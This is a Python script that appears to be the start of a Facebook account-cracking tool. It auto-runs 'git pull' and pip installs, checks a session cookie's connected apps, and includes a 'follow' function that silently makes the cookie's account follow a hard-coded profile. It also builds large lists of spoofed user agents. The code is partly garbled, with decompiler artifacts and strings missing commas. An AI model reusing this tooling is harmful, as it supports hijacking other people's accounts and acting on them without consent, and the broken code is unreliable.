#-------------------------------------------------------------
#Don't Forget To Follow My Github &
#Sent Star This Repositories 🙂
#-------------------------------------------------------------
#!/usr/bin/python3
#-*-coding:utf-8-*-
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
#-----[Global Functions]-----#
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
#-----[Colours]-----#
RED = '\033[1;91m' #
WHITE = '\033[1;97m' #
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m' #
BLUE = '\033[1;34m' #
ORANGE = '\033[1;35m' #
P = '\x1b[1;97m' # 
M = '\x1b[1;91m' # 
H = '\x1b[1;92m' # 
K = '\x1b[1;92m' # 
B = '\x1b[1;94m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;96m' #
N = '\x1b[0m' #
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
mtd,cp_cpx,cokix=[],[],[]
ugen2=[]
mahdiusr=[]
#-----[App Checker]-----#
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO ACTIVE  APK%s  '%(N,M,N,M,N))
    else:
        print(f'\r[😍] %s \x1b[1;95m YOUR ACTIVE APPS   :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSORRY THERE IS NO EXPIRED APK%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🥵] %s \x1b[1;95m YOUR EXPIRED APPS    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://p.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
           
#-----[UserAgent]-----#
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    mahdiusr.append(uaku2)
         



mahdiusr = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/532.2 (KHTML, like Gecko) Chrome/4.0.221.8 Safari/532.2",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.50  [ru]",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; cs) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.7+ (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Windows; U; Windows NT 5.2; nl) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3",
  "Opera/9.64 (X11; Linux i686; U; Linux Mint; nb) Presto/2.1.1",
  "Mozilla/4.0 (compatible; MSIE 5.05; Windows NT 3.51)",
  "Opera/9.50 (Windows NT 5.1; U; ru)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-DE) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; nb) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
  "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (X11; U; Linux i686; nl-NL; rv:1.9.0.19) Gecko/20090720 Firefox/3.5.1",
  "Mozilla/4.0 (compatible; MSIE 4.5; Mac_PowerPC)",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.4+ (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5",
  "Mozilla/5.0 (X11; U; Linux x86_64; ru; rv:1.8.1.8) Gecko/20071022 Ubuntu/7.10 (gutsy) Firefox/2.0.0.8",
  "Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00",
  "Opera/9.62 (Windows NT 5.1; U; ru) Presto/2.1.1",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.13) Gecko/20060410 Firefox/1.0.8",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en-US; rv:1.8.1.13) Gecko/20080313 Firefox",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)",
  "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint:PPC-i830; PPC; 240x320)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0",
  "Opera/6.11 (Linux 2.4.18-4GB i686; U)  [en]",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2) Gecko/20070226 Firefox/2.0.0.2",
  "Opera/9.60 (Windows NT 5.1; U; tr) Presto/2.1.1",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/412.6.2 (KHTML, like Gecko)",
  "Mozilla/5.0 (X11; Linux AMD64) Gecko Firefox/5.0",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.682.0 Safari/534.21",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/85.8.5 (KHTML, like Gecko) Safari/85.8.1",
  "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us) AppleWebKit/312.1 (KHTML, like Gecko) Safari/312",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22",
  "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8.1.5) Gecko/20070713 Firefox/2.0.0.5",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-gb) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/19.0.1047.0 Safari/535.22",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-ch) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.11",
  "Opera/9.20 (Windows NT 5.1; U; zh-tw)",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050405 Firefox/1.0 (Ubuntu package 1.0.2)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
  "Opera/9.22 (Windows NT 5.1; U; SV1; MEGAUPLOAD 2.0; ru)",
  "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.0.9) Gecko/20061219 Fedora/1.5.0.9-1.fc6 Firefox/1.5.0.9 pango-text",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru-RU; rv:1.7.7) Gecko/20050414 Firefox/1.0.3",
  "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
  "Mozilla/2.0 (compatible; MSIE 3.03; Windows 3.1)",
  "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98; DigExt)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; sv) AppleWebKit/522.15.5 (KHTML, like Gecko) Version/3.0.3 Safari/522.15.5",
  "Mozilla/4.0 (compatible; MSIE 5.0; Windows ME) Opera 5.12  [de]",
  "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1)",
  "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.4 (KHTML, like Gecko) Safari/125.9",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.10 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16",
  "Mozilla/5.0 (X11; U; Linux armv7l; en-US; rv:1.9.2.14) Gecko/20110224 Firefox/3.6.14 MB860/Version.0.43.3.MB860.AmericaMovil.en.MX",
  "Mozilla/5.0 (Windows; U; Windows NT 6.0; pl-PL) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.3 (KHTML, like Gecko) Chrome/4.0.223.5 Safari/532.3",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/4.0.207.0 Safari/532.0",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.7) Gecko/20060830 Firefox/1.5.0.7 (Debian-1.5.dfsg+1.5.0.7-1~bpo.1)",
  "Opera/9.52 (X11; Linux x86_64; U; ru)",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27",
  "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2) Gecko/20100305 Gentoo Firefox/3.5.7",
  "Opera/7.54 (Windows NT 5.0; U)  [en]",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.8810.3391 Safari/537.36 Edge/18.14383",
  "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)",
  "Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.04506.648; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.9 Safari/525.19",
  "Mozilla/5.0 (Windows NT 5.2; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0",
   "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.815.0 Safari/535.1",
  "Opera/9.80 (Macintosh; Intel Mac OS X 10.14.1) Presto/2.12.388 Version/12.16",
  "Opera/9.80 (Macintosh; Intel Mac OS X 10.14.1) Presto/2.12.388 Version/12.16",
  "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1b3) Gecko/20090327 Fedora/3.1-0.11.beta3.fc11 Firefox/3.1b3",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Opera/9.23 (Mac OS X; ru)",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
  "Opera/6.02 (Windows NT 4.0; U)  [de]",
  "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-us) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
  "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
 "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
   'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
'Mozilla/5.0 (Linux; Android 13; 23028RN4DG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36[FBAN/EMA;FBLC/cs_CZ;FBAV/353.0.0.5.112;]'
